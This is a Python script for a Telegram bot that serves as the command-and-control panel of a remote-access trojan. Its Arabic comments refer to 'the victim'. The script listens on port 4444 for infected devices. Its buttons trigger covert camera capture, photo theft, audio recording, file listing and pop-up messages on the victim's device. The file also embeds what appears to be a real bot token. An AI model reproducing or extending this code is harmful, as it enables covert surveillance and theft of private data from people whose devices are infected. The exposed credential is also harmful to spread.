import logging
import socket
import threading
import os
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

# --- الإعدادات الأمنية والتقنية ---
TOKEN = "7745042123:AAHERMo9DzTcxSQ7ZtQgF_faQAnD6BngDRw"
ADMIN_ID = 6654753506  # ضع هنا معرفك (Chat ID) لضمان خصوصية التحكم
BIND_PORT = 4444      # المنفذ الذي سيستقبل اتصال الضحية
AGENT_SOCKET = None

logging.basicConfig(level=logging.INFO)

def start(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ غير مصرح لك بالوصول لهذا النظام.")
        return

    keyboard = [
        [InlineKeyboardButton("📸 كاميرا أمامية", callback_data='cam_1'),
         InlineKeyboardButton("📸 كاميرا خلفية", callback_data='cam_0')],
        [InlineKeyboardButton("🖼️ سحب الصور", callback_data='pull_img'),
         InlineKeyboardButton("🎙️ تسجيل صوت", callback_data='record')],
        [InlineKeyboardButton("📳 تفعيل اهتزاز", callback_data='vibrate'),
         InlineKeyboardButton("🔔 إرسال إشعار", callback_data='alert')],
        [InlineKeyboardButton("📂 قائمة الملفات", callback_data='ls')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text('🛡️ متصل بنجاح بمختبر التلغيم. اختر أمراً للبدء:', reply_markup=reply_markup)

def button_handler(update: Update, context: CallbackContext):
    global AGENT_SOCKET
    query = update.callback_query
    query.answer()
    
    if update.effective_user.id != ADMIN_ID: return

    if not AGENT_SOCKET:
        query.edit_message_text("⚠️ لا يوجد جهاز مرتبط حالياً. في انتظار الضحية...")
        return

    cmd = query.data
    if cmd == 'alert':
        query.edit_message_text("أرسل نص الرسالة التي ستظهر في وسط شاشة الضحية:")
        context.user_data['waiting_for_alert'] = True
    else:
        AGENT_SOCKET.send(cmd.encode())
        query.edit_message_text(f"🚀 جاري تنفيذ: {cmd} على الهدف...")

def handle_text(update: Update, context: CallbackContext):
    global AGENT_SOCKET
    if update.effective_user.id == ADMIN_ID and context.user_data.get('waiting_for_alert') and AGENT_SOCKET:
        msg = update.message.text
        # تنسيق الأمر لإظهار إشعار
        AGENT_SOCKET.send(f"msg:{msg}".encode())
        update.message.reply_text(f"✅ تم إرسال الإشعار بنجاح.")
        context.user_data['waiting_for_alert'] = False

def socket_server():
    global AGENT_SOCKET
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # استخدام 0.0.0.0 للسماح بالاتصالات الخارجية على الاستضافة
    s.bind(('0.0.0.0', BIND_PORT))
    s.listen(5)
    print(f"[*] Server Listening for Agents on Port {BIND_PORT}...")
    while True:
        conn, addr = s.accept()
        AGENT_SOCKET = conn
        print(f"[!] New Connection: {addr}")

def main():
    # تشغيل مستمع السوكيت في الخلفية
    threading.Thread(target=socket_server, daemon=True).start()
    
    updater = Updater(TOKEN)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text))
    
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()